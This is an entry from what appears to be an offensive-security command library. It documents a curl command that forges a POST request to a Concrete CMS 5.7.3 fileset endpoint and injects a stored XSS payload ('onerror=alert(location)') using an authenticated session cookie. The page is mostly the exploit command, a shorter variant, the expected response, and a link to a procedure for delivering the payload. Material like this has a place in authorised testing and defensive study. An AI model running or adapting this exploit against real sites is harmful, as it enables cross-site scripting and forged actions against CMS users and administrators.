---
id: cmd-curl-csrf-post
data: >-
  curl -X POST http://target/conc573/index.php/tools/required/files/add_to -d
  "task=add_to_sets" -d "fID[]=1" -d "fsNew=1" -d "fsNewText=\"\"><img src=0
  onerror=alert(location)\">\"" -d "fsNewShare=1" -d "fsID;1=2" --cookie
  "CMS_5.7.3=authenticated_session_cookie"
tags:
  - web
  - csrf
  - post-request
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:31.547Z'
verified: false
validated: true
submitted: true
---
# curl-csrf-post

## Command

```bash
curl -X POST http://target/conc573/index.php/tools/required/files/add_to \
  -d "task=add_to_sets" \
  -d "fID[]=1" \
  -d "fsNew=1" \
  -d "fsNewText=\"\"><img src=0 onerror=alert(location)\">\"" \
  -d "fsNewShare=1" \
  -d "fsID;1=2" \
  --cookie "CMS_5.7.3=authenticated_session_cookie"
```

## Description

This curl command simulates a CSRF POST request to the Concrete CMS fileset addition endpoint, injecting an XSS payload. Use it to test the vulnerability without relying on a victim browser.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `-d` | Data fields for form parameters | Yes |
| `--cookie` | Auth session cookie | Yes |

## Examples

### Basic Usage

```bash
curl -X POST http://target/conc573/index.php/tools/required/files/add_to -d "task=add_to_sets" -d "fID[]=1" --cookie "session=abc"
```

### Advanced Usage

Include full payload as shown in the main command for XSS injection.

## Expected Output

HTTP response code 200 or 302 redirect; no visible output but fileset added if successful. Check target dashboard to confirm.

## Related

- [[Related Procedure: Deliver-CSRF-Payload-for-Malicious-Fileset-Addition]]
